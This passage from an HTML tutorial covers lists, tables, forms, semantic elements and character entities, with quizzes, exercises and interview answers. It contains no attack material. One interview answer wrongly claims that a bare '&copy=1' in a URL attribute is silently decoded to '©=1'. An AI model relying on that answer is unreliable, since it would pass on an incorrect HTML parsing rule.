  <dd>The open, reflowable ebook format published by the W3C.</dd>
</dl>
```

</details>

2. **Nested checklist** — Write a two-step ordered list where step 1 has a nested unordered list of three documents to gather.
<details><summary>Solution</summary>

```html
<ol>
  <li>Gather documents
    <ul>
      <li>Photo ID</li>
      <li>Proof of address</li>
      <li>Engagement letter</li>
    </ul>
  </li>
  <li>Submit the package to QC.</li>
</ol>
```

</details>

### Interview Questions

**Q: When would you choose a description list over a table?**
A `<dl>` describes properties of a single thing (order number, client, date), while a table presents many records that share the same columns. A report cover block, an EPUB metadata summary and a glossary are description lists; a rate matrix is a table. Screen readers announce them differently: a table implies row and column navigation, which is confusing when there is only one "row". If a client asks for a two-column layout for a key–value block, I use a `<dl>` styled with CSS Grid rather than a layout table.

**Q: How do you remove bullets from a navigation list, and why keep it a list at all?**
`ul { list-style: none; padding: 0; margin: 0 }` removes the markers and default indentation. Keeping the `<ul>` preserves semantics: screen readers announce the number of items, and users can jump through the list. One caveat: Safari with VoiceOver stops treating a `list-style: none` list as a list, so adding `role="list"` to the `<ul>` restores the announcement. That detail usually impresses interviewers because it shows real-world testing rather than textbook knowledge.

**Q: What is wrong with `<ul><li>A</li><ul><li>B</li></ul></ul>`?**
The inner `<ul>` is a direct child of the outer `<ul>`, which the content model forbids; only `<li>`, `<script>` and `<template>` are allowed there. Browsers render it anyway, but validators, epubcheck and some DOCX converters reject it, and the nesting is ambiguous for assistive technology because the sub-list is not attached to item A. The fix is to move the inner list inside the `<li>`: `<ul><li>A<ul><li>B</li></ul></li></ul>`. I see this constantly in HTML exported from Google Docs.

# LEVEL: Intermediate

## Tables

A rate matrix, a weekly production summary, an agent QA scorecard: tabular data is the heart of reporting work, and HTML tables are how that data reaches a browser, an EPUB or a WeasyPrint PDF. Tables are for **data**, never for page layout. That rule was learned painfully in the 2000s, and the only place it is still broken on purpose is HTML email, which has its own chapter.

### The minimum table

```html
<table>
  <tr><th>State</th><th>Orders</th></tr>
  <tr><td>Texas</td><td>180</td></tr>
  <tr><td>Florida</td><td>122</td></tr>
</table>
```

`<table>` contains rows (`<tr>`), rows contain cells. `<th>` is a header cell (bold and centred by default, and announced as a header by screen readers); `<td>` is a data cell. Every row should have the same number of cells.

### The full structure

Professional tables split into `<thead>`, `<tbody>` and `<tfoot>`, and start with a `<caption>`.

```html
<table>
  <caption>Orders processed by state, week 37 of 2026</caption>
  <thead>
    <tr><th scope="col">State</th><th scope="col">Orders</th><th scope="col">Avg. turnaround (h)</th></tr>
  </thead>
  <tbody>
    <tr><th scope="row">Texas</th><td>180</td><td>26.4</td></tr>
    <tr><th scope="row">Florida</th><td>122</td><td>31.0</td></tr>
    <tr><th scope="row">Wyoming</th><td>41</td><td>18.9</td></tr>
  </tbody>
  <tfoot>
    <tr><th scope="row">Total</th><td>343</td><td>27.1</td></tr>
  </tfoot>
</table>
```

Why bother with the sections?

- `<caption>` is the table's title. Screen readers read it first, and WeasyPrint keeps it with the table across page breaks.
- `<thead>` repeats at the top of every printed page in WeasyPrint and in browser print preview when a table spans pages. For a 40-page rate matrix this is the difference between a usable PDF and a useless one.
- `<tfoot>` holds totals; it is written before or after `<tbody>` but always renders at the bottom.
- `scope="col"` and `scope="row"` tell assistive technology which cells a header describes, so a blind user hearing "26.4" also hears "Texas, Avg. turnaround".

### Spanning cells

`colspan` merges a cell across columns and `rowspan` across rows. Use them for grouped headers, exactly as you would merge cells in Excel.

```html
<thead>
  <tr>
    <th rowspan="2" scope="col">Policy amount</th>
    <th colspan="2" scope="colgroup">Premium (USD)</th>
  </tr>
  <tr>
    <th scope="col">Owner</th>
    <th scope="col">Lender</th>
  </tr>
</thead>
<tbody>
  <tr><td>$50,000</td><td>496</td><td>446</td></tr>
  <tr><td>$100,000</td><td>832</td><td>782</td></tr>
</tbody>
```

Count carefully: a `rowspan="2"` in row one means row two has one fewer cell. When the arithmetic is wrong the browser pads the table with empty cells and the layout looks "shifted", a classic bug in generated rate matrices.

### Column groups

`<colgroup>` and `<col>` let you style or size whole columns without touching every cell, and they are the only clean way to set column widths for WeasyPrint.

```html
<table>
  <colgroup>
    <col style="width: 40%">
    <col span="2" style="width: 30%">
  </colgroup>
  …
</table>
```

| Element | Required? | Notes |
|---|---|---|
| `caption` | Recommended | First child of `table` |
| `colgroup` / `col` | Optional | Before `thead` |
| `thead` | Recommended | One only; repeats on printed pages |
| `tbody` | Implied | Browsers insert one if you omit it |
| `tfoot` | Optional | Totals |

### Styling basics you will always need

Browsers render tables with double borders and no padding. Three CSS lines fix that, and you will paste them into every report template:

```css
table { border-collapse: collapse; width: 100%; }
th, td { border: 1px solid #999; padding: 4px 8px; text-align: left; }
td.num { text-align: right; font-variant-numeric: tabular-nums; }
```

Numbers right-aligned with tabular figures line up their decimal points, which is what finance readers expect.

> **Warning:** The browser always inserts a `<tbody>` even if you did not write one. Code that scrapes tables with `table > tr` finds nothing in Chrome DevTools, while lxml parsing the raw file does find rows. Write `<tbody>` explicitly and the two worlds agree.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Rate matrix</title>
<style>
  body{font-family:Arial,sans-serif;margin:2rem}
  table{border-collapse:collapse;width:100%}
  caption{caption-side:top;font-weight:bold;margin-bottom:.5rem}
  th,td{border:1px solid #999;padding:4px 8px;text-align:left}
  td.num{text-align:right;font-variant-numeric:tabular-nums}
  thead th{background:#eee}
  tfoot{font-weight:bold}
</style></head>
<body>
<table>
  <caption>Texas owner's and lender's premiums (extract)</caption>
  <thead>
    <tr><th rowspan="2" scope="col">Policy amount</th><th colspan="2" scope="colgroup">Premium (USD)</th></tr>
    <tr><th scope="col">Owner</th><th scope="col">Lender</th></tr>
  </thead>
  <tbody>
    <tr><th scope="row">$50,000</th><td class="num">496</td><td class="num">446</td></tr>
    <tr><th scope="row">$100,000</th><td class="num">832</td><td class="num">782</td></tr>
    <tr><th scope="row">$150,000</th><td class="num">1,113</td><td class="num">1,063</td></tr>
  </tbody>
  <tfoot>
    <tr><th scope="row">Rows</th><td class="num" colspan="2">3</td></tr>
  </tfoot>
</table>
</body>
</html>
```

### Quiz

1. Which element marks a header cell?
- [ ] `<td>`
- [x] `<th>`
- [ ] `<caption>`
> `<th>` is announced as a header and is bold by default.

2. What does `<thead>` do when a long table is printed with WeasyPrint?
- [x] Its rows repeat at the top of every page
- [ ] It is hidden
- [ ] It moves to the last page
> Header rows repeating per page is the main practical reason to use `<thead>`.

3. A header cell that spans two columns uses which attribute?
- [ ] `rowspan="2"`
- [x] `colspan="2"`
- [ ] `span="2"`
> `colspan` merges across columns; `rowspan` down rows; `span` is only for `<col>`.

4. What does `scope="row"` communicate?
- [x] This header describes the cells in its row
- [ ] This cell should be right-aligned
- [ ] This row should repeat on each page
> `scope` links header cells to the data they describe for assistive technology.

### Exercises

1. **QA scorecard** — Build a table with caption "Agent QA scores, August", column headers Agent / Files checked / Errors / Accuracy, two data rows, and a footer row with totals.
<details><summary>Solution</summary>

```html
<table>
  <caption>Agent QA scores, August</caption>
  <thead><tr><th scope="col">Agent</th><th scope="col">Files checked</th><th scope="col">Errors</th><th scope="col">Accuracy</th></tr></thead>
  <tbody>
    <tr><th scope="row">Sana</th><td>210</td><td>4</td><td>98.1%</td></tr>
    <tr><th scope="row">Bilal</th><td>195</td><td>9</td><td>95.4%</td></tr>
  </tbody>
  <tfoot><tr><th scope="row">Total</th><td>405</td><td>13</td><td>96.8%</td></tr></tfoot>
</table>
```

</details>

2. **Fix the span arithmetic** — Row one has `<th rowspan="2">` plus two more `<th>`; row two has three `<th>`. What is wrong and how do you fix it?
<details><summary>Solution</summary>

Row two already receives the spanned cell from row one, so it must have only two cells of its own. Remove one `<th>` from row two.

</details>

### Interview Questions

**Q: Why should tables not be used for page layout?**
Layout tables mix structure with presentation: screen readers announce rows and columns that mean nothing, the content order in the source is dictated by the grid rather than by reading order, and the page cannot reflow on a phone. CSS Flexbox and Grid do everything layout tables did, with responsive behaviour and clean semantics. The one surviving exception is HTML email, where Outlook's Word-based renderer ignores most CSS layout, so tables with `role="presentation"` remain the standard there. Knowing the exception shows practical experience.

**Q: How do you make a wide data table usable on a small screen?**
There is no single answer, which is what the interviewer wants you to say. Options are: wrap the table in a `div` with `overflow-x: auto` so it scrolls horizontally; hide low-priority columns with a media query; or restructure rows into stacked cards using `display: block` on cells plus `data-label` attributes rendered with `::before`. For a rate matrix I keep the table intact and let it scroll, because the row-and-column relationship *is* the information. I also keep `<th scope>` attributes so the stacked version still reads correctly in a screen reader.

**Q: What is the difference between `border-collapse: collapse` and `separate`?**
`separate` (the default) draws each cell's border independently, leaving a gap controlled by `border-spacing`, which gives the classic doubled-line look. `collapse` merges adjacent borders into one line and resolves conflicts by width and style precedence, so `th, td { border: 1px solid }` yields a clean grid. Collapse also allows borders on `<tr>` and `<col>` elements, which separate ignores. In WeasyPrint both modes work, but collapse is what nearly every report template uses.

## Forms & inputs

Forms are how a page collects information: a Fiverr order intake, an internal request to update a rate calculator, a survey for BPO agents. Even though the fillable forms you build for clients are PDFs with AcroForm fields, the HTML form vocabulary is the same idea, and it is what every web app you touch is built on.

### The form element

```html
<form action="/submit-order" method="post">
  …controls go here…
  <button type="submit">Send request</button>
</form>
```

`action` is the URL that receives the data and `method` is the HTTP verb: `get` puts the values in the URL (fine for search boxes), `post` sends them in the request body (required for anything that changes data or contains personal information). When the user submits, the browser collects every control that has a `name` attribute and sends `name=value` pairs. **No `name`, no data.**

### Labels

Every control needs a `<label>`. Clicking a label focuses its control, screen readers announce it, and it doubles the tap target on phones. Connect them with `for` and `id`, or wrap the control inside the label.

```html
<label for="client">Client name</label>
<input type="text" id="client" name="client" required>

<label><input type="checkbox" name="rush" value="yes"> Rush order (24 h)</label>
```

### Input types

The `type` attribute changes the control, the on-screen keyboard on mobile and the built-in validation.

| `type` | Shows | Good for |
|---|---|---|
| `text` | Single line | Names, order numbers |
| `email` | Text with @ keyboard, validates format | Email address |
| `tel` | Numeric keypad | Phone |
| `number` | Spinner with `min`, `max`, `step` | Page counts, quantities |
| `date` | Date picker | Closing date |
| `password` | Masked text | Passwords |
| `checkbox` | Toggle, several may be ticked | Options |
| `radio` | One of a group with the same `name` | Policy type |
| `file` | File picker with `accept` | Upload a DOCX |
| `hidden` | Nothing; sent with the form | Order id |
| `range` | Slider | Quality threshold |
| `color` | Colour picker | Brand colour |

```html
<label for="pages">Page count</label>
<input type="number" id="pages" name="pages" min="1" max="2000" step="1" value="1">

<fieldset>
  <legend>Policy type</legend>
  <label><input type="radio" name="policy" value="owner" checked> Owner's</label>
  <label><input type="radio" name="policy" value="lender"> Lender's</label>
</fieldset>
```

`<fieldset>` groups related controls and `<legend>` names the group; screen readers read the legend before each radio so "Owner's" becomes "Policy type, Owner's".

### Select, textarea and datalist

```html
<label for="state">State</label>
<select id="state" name="state">
  <option value="">Choose…</option>
  <optgroup label="Priority states">
    <option value="TX" selected>Texas</option>
    <option value="FL">Florida</option>
  </optgroup>
  <option value="WY">Wyoming</option>
</select>

<label for="notes">Special instructions</label>
<textarea id="notes" name="notes" rows="4" maxlength="500"></textarea>

<label for="font">Brand font</label>
<input list="fonts" id="font" name="font">
<datalist id="fonts">
  <option value="Calibri"><option value="Garamond"><option value="Montserrat">
</datalist>
```

`<select>` sends the chosen `<option>`'s `value`. `<textarea>` is a multi-line box whose default text goes *between* the tags, not in a `value` attribute. `<datalist>` gives a text input autocomplete suggestions while still allowing free typing.

### Buttons

```html
<button type="submit">Send</button>
<button type="reset">Clear</button>
<button type="button" onclick="preview()">Preview</button>
```

Inside a form, a `<button>` defaults to `type="submit"`, so a "Preview" button without `type="button"` will submit the form. That bug has bitten every developer once. Prefer `<button>` over `<input type="submit">` because it can contain icons and markup.

### Attributes that shape the experience

- `required`: the browser refuses to submit an empty control.
- `disabled`: greyed out and *not sent*. `readonly`: shown, not editable, *is sent*.
- `autocomplete="name"`, `"email"`, `"postal-code"`: lets the browser fill known values.
- `autofocus`: focuses the control on load. Use once per page.
- The hint-text attribute you will see in the Try It block shows grey example text inside an empty field; it is *not* a substitute for a label, because it disappears as soon as the user types.

> **Interview note:** "How does form data reach the server?" As `application/x-www-form-urlencoded` pairs by default. A form with a file input must declare `enctype="multipart/form-data"` or the file is sent as its name only. GET forms cannot upload files at all.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Order intake</title>
<style>
  body{font-family:Arial,sans-serif;margin:2rem;max-width:520px}
  label{display:block;margin-top:.8rem;font-weight:bold}
  input,select,textarea{width:100%;padding:.4rem;margin-top:.2rem;box-sizing:border-box}
  fieldset label, label.inline{display:inline;font-weight:normal;margin-right:1rem}
  input[type=radio],input[type=checkbox]{width:auto}
  button{margin-top:1rem;padding:.5rem 1rem}
</style></head>
<body>
<form action="#" method="post" onsubmit="event.preventDefault(); out.textContent = JSON.stringify(Object.fromEntries(new FormData(this)), null, 2)">
  <label for="client">Client name</label>
  <input type="text" id="client" name="client" placeholder="e.g. Northwind Realty" required autocomplete="organization">
  <label for="email">Email</label>
  <input type="email" id="email" name="email" required>
  <label for="pages">Page count</label>
  <input type="number" id="pages" name="pages" min="1" max="2000" value="120">
  <label for="due">Due date</label>
  <input type="date" id="due" name="due">
  <fieldset><legend>Deliverable</legend>
    <label><input type="radio" name="format" value="docx" checked> DOCX</label>
    <label><input type="radio" name="format" value="pdf"> PDF</label>
    <label><input type="radio" name="format" value="epub"> EPUB</label>
  </fieldset>
  <label for="state">State</label>
  <select id="state" name="state"><option value="TX">Texas</option><option value="FL">Florida</option><option value="WY">Wyoming</option></select>
  <label for="notes">Notes</label>
  <textarea id="notes" name="notes" rows="3" placeholder="Brand fonts, colours, TOC depth…"></textarea>
  <label class="inline"><input type="checkbox" name="rush" value="yes"> Rush (24 h)</label>
  <button type="submit">Submit</button>
</form>
<pre id="out"></pre>
</body>
</html>
```

### Quiz

1. Which attribute must a control have for its value to be submitted?
- [ ] `id`
- [x] `name`
- [ ] `label`
> The browser sends `name=value` pairs; `id` is only for labels and scripts.

2. How do radio buttons become one mutually exclusive group?
- [x] They share the same `name`
- [ ] They share the same `id`
- [ ] They are inside the same `<div>`
> Same `name`, different `value`; only one is sent.

3. A form uploads a DOCX. Which attribute is required on `<form>`?
- [ ] `method="get"`
- [x] `enctype="multipart/form-data"`
- [ ] `type="file"`
> Without multipart encoding only the file name is transmitted.

4. Which control's value is shown but not editable and *is* submitted?
- [ ] `disabled`
- [x] `readonly`
- [ ] `hidden`
> `disabled` controls are excluded from submission; `readonly` ones are included.

### Exercises

1. **Agent feedback form** — Build a POST form with a required agent name, a 1–10 `range` for QA score, a `select` of shifts (Morning/Evening/Night) and a submit button, all labelled.
<details><summary>Solution</summary>

```html
<form action="/feedback" method="post">
  <label for="agent">Agent name</label>
  <input type="text" id="agent" name="agent" required>
  <label for="score">QA score</label>
  <input type="range" id="score" name="score" min="1" max="10" value="7">
  <label for="shift">Shift</label>
  <select id="shift" name="shift">
    <option value="morning">Morning</option>
    <option value="evening">Evening</option>
    <option value="night">Night</option>
  </select>
  <button type="submit">Send feedback</button>
</form>
```

</details>

2. **Find the bug** — A "Preview" `<button>` inside a form submits the form. Why, and what is the fix?
<details><summary>Solution</summary>

Buttons inside a form default to `type="submit"`. Add `type="button"` to the Preview button.

</details>

### Interview Questions

**Q: What is the difference between GET and POST forms?**
GET appends the fields to the URL as a query string, so the request is bookmarkable, cacheable and visible in history and server logs; it is right for search and filters, and wrong for anything private or state-changing. POST sends the fields in the request body, supports file uploads via multipart encoding, has no practical length limit and is not cached by default. Browsers warn about resubmitting a POST on refresh, which is why the post-redirect-get pattern exists. A strong candidate mentions that neither method is "secure" without HTTPS, because both travel in plain text otherwise.

**Q: Why is a visible `<label>` better than hint text alone?**
Hint text inside the field disappears when the user starts typing, so they lose the prompt while filling a long form, and its low-contrast grey often fails WCAG contrast requirements. A `<label>` stays visible, is announced by screen readers, and enlarges the click target. The correct pattern is a label for the field's name and optional hint text for an example format. In the 168-field AcroForm projects I build, the equivalent is giving every field a tooltip, which is what Acrobat's accessibility checker demands.

**Q: How does the browser decide which button submits when the user presses Enter?**
The first submit button in tree order is the form's default button, and pressing Enter in a text input activates it, including its `name`/`value` and any `formaction` override. If there is no submit button but exactly one text-type field, Enter still submits (implicit submission). This matters when a form has both a "Delete" and a "Save" button: put "Save" first in the source, or make "Delete" `type="button"` handled by script. I mention `formaction`, `formmethod` and `formnovalidate` on buttons because they let one form post to different endpoints.

## Block vs inline, div, span & semantic elements

Every element has a default display behaviour, and two "meaningless" elements (`<div>` and `<span>`) exist purely to give you hooks for CSS and JavaScript. HTML5 then added a family of **semantic** elements that say what a region *is*. Knowing when to use each one is the difference between a page that reads well to machines and one that is a soup of divs.

### Block-level vs inline

A **block-level** element starts on a new line and stretches to fill the width of its container: `<p>`, `<h1>`–`<h6>`, `<ul>`, `<table>`, `<div>`, `<section>`. An **inline** element flows within a line of text and is only as wide as its content: `<a>`, `<strong>`, `<em>`, `<span>`, `<img>`, `<code>`.

```html
<p>This <strong>inline</strong> element stays in the sentence.</p>
<div>This block starts a new line.</div>
<div>So does this one.</div>
```

Two rules follow. Inline elements may not contain block elements (`<span><p>…</p></span>` is invalid). And `width`, `height`, and vertical margins do not apply to inline elements; if you need them, CSS `display: inline-block` or `block` changes the behaviour without changing the element.

| Category | Elements | Default CSS |
|---|---|---|
| Block | `div section article p h1–h6 ul ol table form` | `display: block` |
| Inline | `span a strong em code img label` | `display: inline` |
| Replaced inline | `img input select` | Inline but sized by their content |

HTML5 replaced the block/inline split with content categories (flow, phrasing, etc.), but "block vs inline" remains the vocabulary interviewers use.

### div and span

`<div>` is a generic block container; `<span>` is a generic inline container. Neither has meaning. Use them only when no semantic element fits and you need a hook:

```html
<div class="card">
  <p>Turnaround: <span class="kpi">26.4 h</span></p>
</div>
```

The test: if you can name what the box *is* (a header, an article, a navigation menu), there is probably a semantic element for it. If it is just "a box for styling", `<div>` is correct and nothing to be ashamed of.

### The semantic landmarks

| Element | Meaning | Use once or many? |
|---|---|---|
| `<header>` | Introductory content for the page or a section | Many |
| `<nav>` | Major navigation links | Few |
| `<main>` | The unique content of this page | Exactly one |
| `<article>` | Self-contained piece that makes sense alone (a post, a report, a chapter) | Many |
| `<section>` | Thematic grouping with a heading | Many |
| `<aside>` | Tangential content: sidebars, pull quotes, related links | Many |
| `<footer>` | Footer for the page or a section | Many |
| `<figure>` / `<figcaption>` | Illustration with caption | Many |
| `<address>` | Contact information for the nearest `article` or `body` | Few |
| `<details>` / `<summary>` | Collapsible disclosure widget | Many |

```html
<body>
  <header>
    <p class="brand">Ali Raza Documents</p>
    <nav aria-label="Main"><ul><li><a href="/">Home</a></li><li><a href="/reports/">Reports</a></li></ul></nav>
  </header>
  <main>
    <article>
      <header><h1>Weekly Production Report</h1><p>Week 37, 2026</p></header>
      <section><h2>Summary</h2><p>343 orders processed.</p></section>
      <section><h2>By state</h2><p>Texas leads with 180.</p></section>
      <footer><p>Prepared by Production Support.</p></footer>
    </article>
    <aside><h2>Related</h2><p><a href="week-36.html">Week 36 report</a></p></aside>
  </main>
  <footer><address>Contact: <a href="mailto:ali@example.com">ali@example.com</a></address></footer>
</body>
```

Screen readers expose `header`, `nav`, `main`, `aside` and `footer` as **landmarks**, so a user can jump straight to the main content. EPUB3 readers map the same elements (with `epub:type`) to their navigation features, and WeasyPrint uses `<section>` boundaries naturally with `break-before: page`.

### section vs article vs div

Ask three questions. Would this content make sense syndicated on its own, like a chapter or a blog post? Then `<article>`. Is it a thematic part of a larger whole with its own heading? Then `<section>`. Is it just a styling wrapper with no heading and no meaning? Then `<div>`. A `<section>` without a heading is nearly always a `<div>` in disguise.

### details and summary

`<details>` gives you an expand/collapse widget with no JavaScript, used by this very site for exercise solutions.

```html
<details>
  <summary>Show the escalation matrix</summary>
  <p>Level 1: team lead. Level 2: operations manager.</p>
</details>
```

> **Tip:** Lighthouse and axe both flag pages with no `<main>` landmark. Adding `<main>` is a free accessibility score point, and it costs one element.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Semantic layout</title>
<style>
  body{font-family:Arial,sans-serif;margin:0}
  header,footer{background:#E34F26;color:#fff;padding:1rem}
  nav a{color:#fff;margin-right:1rem}
  main{display:flex;gap:1rem;padding:1rem}
  article{flex:3} aside{flex:1;background:#f4f4f4;padding:1rem}
  .kpi{font-weight:bold;color:#E34F26}
</style></head>
<body>
  <header>
    <strong>Ali Raza Documents</strong>
    <nav aria-label="Main"><a href="#">Home</a><a href="#">Reports</a><a href="#">Contact</a></nav>
  </header>
  <main>
    <article>
      <h1>Weekly Production Report</h1>
      <section><h2>Summary</h2><p>Orders processed: <span class="kpi">343</span></p></section>
      <details><summary>Escalation matrix</summary><p>Level 1: team lead. Level 2: operations manager.</p></details>
    </article>
    <aside><h2>Related</h2><p><a href="#">Week 36 report</a></p></aside>
  </main>
  <footer><address>ali@example.com</address></footer>
</body>
</html>
```

### Quiz

1. Which element should appear exactly once per page?
- [ ] `<section>`
- [x] `<main>`
- [ ] `<header>`
> `<main>` holds the page's unique content and is a single landmark.

2. Which element is inline by default?
- [ ] `<div>`
- [ ] `<p>`
- [x] `<span>`
> `<span>` flows inside text; `<div>` and `<p>` are blocks.

3. A blog post that could be syndicated on its own should be wrapped in…
- [x] `<article>`
- [ ] `<section>`
- [ ] `<aside>`
> `<article>` marks self-contained content.

4. When is `<div>` the right choice?
- [ ] Never, in HTML5
- [x] When the box has no meaning and exists only for styling or scripting
- [ ] For every paragraph
> `<div>` is a legitimate generic container; overuse, not use, is the problem.

### Exercises

1. **Refactor the div soup** — Rewrite `<div id="top"><div id="menu">…</div></div><div id="content"><div class="post">…</div></div><div id="bottom">…</div>` with semantic elements.
<details><summary>Solution</summary>

```html
<header><nav>…</nav></header>
<main><article>…</article></main>
<footer>…</footer>
```

</details>

2. **Chapter structure** — Mark up an EPUB chapter titled "Chapter 3: Rate Calculation" containing two sections with headings and a pull-quote aside.
<details><summary>Solution</summary>

```html
<article>
  <h1>Chapter 3: Rate Calculation</h1>
  <section><h2>Inputs</h2><p>Policy amount, property type and county.</p></section>
  <aside><p>"Round to the nearest thousand before looking up the tier."</p></aside>
  <section><h2>Lookup</h2><p>Find the tier row and read the premium column.</p></section>
</article>
```

</details>

### Interview Questions

**Q: Why prefer semantic elements over divs with class names?**
Semantic elements carry meaning that machines can use without reading your class names: screen readers expose landmarks for navigation, search engines weight `<article>` and `<nav>` content differently, reader modes in browsers extract `<main>` and `<article>`, and EPUB readers build navigation from them. They also make the source self-documenting for the next developer. Divs are not wrong, they are just mute. My rule is to reach for the semantic element first and fall back to `<div>` only when no meaning exists, which typically leaves a handful of divs for layout wrappers.

**Q: What is the difference between `<section>` and `<article>`?**
`<article>` is content that is complete on its own and would still make sense if you extracted it: a news story, a forum post, a product card, a report chapter. `<section>` groups related content inside a larger document and should have its own heading; it is a chapter's sub-topic, not the chapter. They nest both ways: an article can have sections, and a section can list several articles. If there is no natural heading, neither is right and a `<div>` is honest.

**Q: Can a page have more than one `<header>` or `<footer>`?**
Yes. `<header>` and `<footer>` are scoped to their nearest sectioning ancestor, so every `<article>` or `<section>` can have its own. Only the ones that are direct children of `<body>` become the `banner` and `contentinfo` landmarks for assistive technology; the nested ones are plain groups. `<main>` is the exception: exactly one visible `<main>` per page. This nuance is a common follow-up question after "name the semantic elements".

## Entities & special characters

Some characters cannot be typed straight into HTML because they mean something to the parser, and others (curly quotes, em dashes, the section sign in legal text, Urdu letters) are hard to type on a US keyboard. HTML **character references**, usually called entities, solve both problems. With UTF-8 you need far fewer of them than tutorials from 2005 suggest, but the ones you do need are non-negotiable.

### The five you must escape

| Character | Named entity | Numeric | Why |
|---|---|---|---|
| `<` | `&lt;` | `&#60;` | Starts a tag |
| `>` | `&gt;` | `&#62;` | Ends a tag |
| `&` | `&amp;` | `&#38;` | Starts an entity |
| `"` | `&quot;` | `&#34;` | Ends an attribute value |
| `'` | `&apos;` | `&#39;` | Ends a single-quoted attribute |

```html
<p>Use &lt;strong&gt; for importance, not &lt;b&gt;.</p>
<p>Smith &amp; Sons, Title Agents</p>
<a href="/search?q=owner&amp;state=TX">Owner policies in Texas</a>
```

Look at the last line. An `&` inside an attribute value must also be `&amp;`. Browsers usually recover from a bare `&state=`, but XHTML (EPUB) does not, and epubcheck's most frequent error on converted books is exactly this: an unescaped ampersand in a URL.

### Typographic characters

Word documents are full of characters that make text look professional. In UTF-8 you can paste them directly, but knowing the entities lets you generate them from templates and keeps your source ASCII-safe when a client's system mangles encodings.

| Character | Named | Numeric | Name |
|---|---|---|---|
| ' ' | `&lsquo;` `&rsquo;` | `&#8216;` `&#8217;` | Curly single quotes |
| " " | `&ldquo;` `&rdquo;` | `&#8220;` `&#8221;` | Curly double quotes |
| – | `&ndash;` | `&#8211;` | En dash (ranges: pages 12–15) |
| — | `&mdash;` | `&#8212;` | Em dash (a break—like this) |
| … | `&hellip;` | `&#8230;` | Ellipsis |
| © ® ™ | `&copy;` `&reg;` `&trade;` | `&#169;` `&#174;` `&#8482;` | Legal marks |
| § ¶ | `&sect;` `&para;` | `&#167;` `&#182;` | Section and pilcrow, common in policies |
| ° | `&deg;` | `&#176;` | Degrees |
| € £ ₹ | `&euro;` `&pound;` | `&#8364;` `&#163;` `&#8377;` | Currency (no named entity for the rupee) |
| (space) | `&nbsp;` | `&#160;` | Non-breaking space |

```html
<p>Policy amounts from $50,000&ndash;$100,000 are priced under &sect;&nbsp;4.2 of the manual.</p>
<p>&copy; 2026 Ali Raza. All rights reserved.</p>
```

### The non-breaking space

`&nbsp;` glues two words so a line never breaks between them: `&sect;&nbsp;4.2`, `10&nbsp;MB`, `Dr.&nbsp;Khan`. It is also the classic hack for "adding spaces", which you should never do; use CSS padding. A related character is the soft hyphen `&shy;` (`&#173;`), which tells the browser and WeasyPrint where a long word *may* break: `Doku&shy;menten&shy;automation`.

### Numeric references and Unicode

Any Unicode code point can be written as `&#DECIMAL;` or `&#xHEX;`. The Urdu letter ک is `&#1705;` or `&#x6A9;`; the check mark ✓ is `&#10003;`. Named entities are limited to a list of about 2,200 defined by HTML; numeric ones are universal, which is why they are the safe choice in XHTML.

```html
<p lang="ur">&#1604;&#1575;&#1729;&#1608;&#1585;</p>  <!-- لاہور -->
<p>QC passed &#10003; &nbsp; QC failed &#10007;</p>
```

### Entities in XHTML and EPUB

XML only defines five named entities: `&lt;`, `&gt;`, `&amp;`, `&quot;` and `&apos;`. In an EPUB3 `.xhtml` file `&nbsp;`, `&mdash;` and friends are **errors** unless a DTD declares them, and XHTML5 has no DTD. Use the numeric form (`&#160;`, `&#8212;`) or simply type the UTF-8 character. Most EPUB toolchains (Calibre, Sigil, Pandoc) convert named entities for you, but hand-edited files and Jinja2 templates will not.

> **Warning:** A page saved as Windows-1252 but declared as UTF-8 shows `â€”` where an em dash should be. If you see that pattern, the fix is re-saving the file as UTF-8, never sprinkling entities over the symptoms.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Entities</title>
<style>body{font-family:Georgia,serif;margin:2rem;line-height:1.6} code{background:#eee;padding:0 4px}</style></head>
<body>
  <h1>Character references</h1>
  <p>Write <code>&lt;strong&gt;</code> for importance. Smith &amp; Sons handle Texas &amp; Florida.</p>
  <p>Premiums for $50,000&ndash;$100,000 fall under &sect;&nbsp;4.2 &mdash; see the rate manual&hellip;</p>
  <p>&ldquo;Round first, then look up,&rdquo; the trainer said. It&rsquo;s the rule.</p>
  <p>&copy; 2026 Ali Raza&trade; &middot; 25&nbsp;&deg;C in Lahore &middot; &euro;120 / &pound;100 / &#8377;9,500</p>
  <p lang="ur">&#1604;&#1575;&#1729;&#1608;&#1585;</p>
  <p>QC passed &#10003; &nbsp; QC failed &#10007;</p>
  <p>Doku&shy;menten&shy;automation is a very long word that may hyphenate when the box is narrow.</p>
</body>
</html>
```

### Quiz

1. How must `&` be written in an `href` value?
- [ ] `&`
- [x] `&amp;`
- [ ] `&and;`
> Ampersands start entities, so a literal one must be escaped, especially in XHTML.

2. Which named entities are valid in XHTML/EPUB without a DTD?
- [x] Only `&lt; &gt; &amp; &quot; &apos;`
- [ ] All HTML entities
- [ ] None
> XML predefines five; everything else needs the numeric form or the raw UTF-8 character.

3. What does `&#8212;` produce?
- [ ] En dash
- [x] Em dash
- [ ] Hyphen
> U+2014 (decimal 8212) is the em dash; the en dash is 8211.

4. What is `&shy;` for?
- [ ] Hiding text
- [x] Marking where a long word may hyphenate
- [ ] Inserting a visible hyphen
> A soft hyphen is invisible unless the line breaks at it.

### Exercises

1. **Escape the snippet** — Show the text `<a href="?a=1&b=2">` literally on a page inside `<code>`.
<details><summary>Solution</summary>

```html
<code>&lt;a href="?a=1&amp;b=2"&gt;</code>
```

</details>

2. **EPUB-safe rewrite** — Convert `Terms&nbsp;&amp;&nbsp;Conditions&mdash;v2` to a form valid in XHTML5.
<details><summary>Solution</summary>

```html
Terms&#160;&amp;&#160;Conditions&#8212;v2
```

`&amp;` is one of the five XML entities and stays; `&nbsp;` and `&mdash;` become numeric.

</details>

### Interview Questions

**Q: Why does an unescaped `&` sometimes work and sometimes break?**
The HTML parser tries to read an entity after every `&`; if the following characters do not match a known entity name followed by `;` (or a legacy name like `&copy` without a semicolon), it treats the `&` as literal text. So `Smith & Sons` renders fine, but `?owner&copy=1` silently becomes `?owner©=1` because `&copy` is a legacy entity. XML parsers used by EPUB and XHTML have no recovery at all and fail on any bare ampersand. Always escaping is cheaper than debugging a URL that changed meaning.

**Q: With UTF-8 everywhere, do we still need entities?**
